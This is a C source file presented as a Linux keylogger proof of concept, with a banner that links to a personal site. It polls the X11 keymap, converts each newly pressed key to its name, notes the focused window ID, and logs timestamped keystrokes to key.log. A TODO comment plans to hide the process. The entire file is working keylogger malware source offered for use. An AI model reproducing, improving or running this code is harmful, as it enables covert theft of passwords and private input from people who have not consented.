// ==============================================================================
// Linux Keylogger ( PoC )
//
// TODO:
// - log every existing key
// - hide process
// - improve Code ( a switch case, should be better for the second for loop )
// ==============================================================================
#include <X11/Xlib.h>
#include <stdio.h>
#include <stdarg.h>
#include <time.h>
#include <string.h>
// ==============================================================================
void LogMe (const char * fmt, ...)
{
	va_list		va_alist;
	char		buf[256],logbuf[256];
	FILE*		file;
	struct tm*	current_tm;
	time_t	current_time;
	time ( &current_time );
	current_tm = localtime ( &current_time );
	sprintf ( logbuf, "%02d:%02d:%02d-> ", current_tm->tm_hour, current_tm->tm_min, current_tm->tm_sec );
	va_start( va_alist, fmt );
	vsprintf( buf, fmt, va_alist );
	va_end( va_alist );
	strcat( logbuf, buf );
	strcat( logbuf, "\n");

	if( ( file = fopen( "key.log", "a+") ) != NULL )
	{
		fputs( logbuf, file );
		fclose( file );
	}
}
// ==============================================================================
int main( int argc, char* argv[] )
{
    Display * display;

    char szKey[32];
    char szKeyOld[32] = {0};

    char szBit;
    char szBitOld;
    int  iCheck;

    char szKeysym;
    char * szKeyString;

    int iKeyCode;

    Window focusWin = NULL;
    int iReverToReturn = NULL;

    printf( "%s\n%s\n\n",
    "Linux Keylogger - Visit www.hamsterbaum.de",
    "Version: 0.1");

    display = XOpenDisplay( NULL );

    if( display == NULL )
    {
        printf( "Error: XOpenDisplay" );
        return -1;
    }

    while( true )
    {
        XQueryKeymap( display, szKey );

        if( memcmp( szKey, szKeyOld, 32 ) != NULL )
        {
            for( int i = 0; i < sizeof( szKey ); i++ )
            {
                szBit = szKey[i];
                szBitOld = szKeyOld[i];
                iCheck = 1;

                for ( int j = 0 ; j < 8 ; j++ )
                {
                     if ( ( szBit & iCheck ) && !( szBitOld & iCheck ) )
                     {
                         iKeyCode = i * 8 + j ;

                         szKeysym = XKeycodeToKeysym( display, iKeyCode, 0 );
                         szKeyString = XKeysymToString( szKeysym );

                         XGetInputFocus( display, &focusWin, &iReverToReturn );
                         printf( "WindowID %x Key: %s\n", focusWin, szKeyString );

                         LogMe( "WindowID %x Key: %s\n", focusWin, szKeyString );
                     }
                    iCheck = iCheck << 1 ;
                }
            }
        }
        memcpy( szKeyOld, szKey, 32 );
    }
    XCloseDisplay( display );
    return 0;
}

